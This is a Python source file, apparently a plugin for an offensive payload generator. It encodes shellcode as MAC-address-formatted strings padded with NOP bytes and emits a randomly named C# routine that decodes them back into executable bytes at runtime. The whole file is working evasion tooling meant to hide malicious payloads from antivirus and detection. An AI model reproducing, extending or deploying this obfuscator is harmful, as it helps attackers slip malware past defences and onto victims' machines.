import random
import string

class MACObfuscate:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.decodedlength = len(decoded)
        for i in range(0, len(decoded), 6):
            chunk = decoded[i:i+6]
            if len(chunk) < 6:
                chunk = chunk + (b"\x90" * (6 - len(chunk)))
            encoded.append('-'.join([ f'{chunk[n]:02x}' for n in range(0, 6)]))
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}({{shellcode}})')

    def codeblock(self) -> str:
        return f"""
        public static byte[] {self.name}(string[] encoded)
        {{
            byte[] decoded = new byte[encoded.Length*6];
            for (int i=0; i<encoded.Length; i++){{
                string[] octets = encoded[i].Split(new [] {{'-'}});
                for (int j=0; j<6; j++){{
                    decoded[i*6+j] = (byte)Convert.ToInt32(octets[j], 16);
                }}
            }}
            return decoded[..{self.decodedlength}];
        }}
"""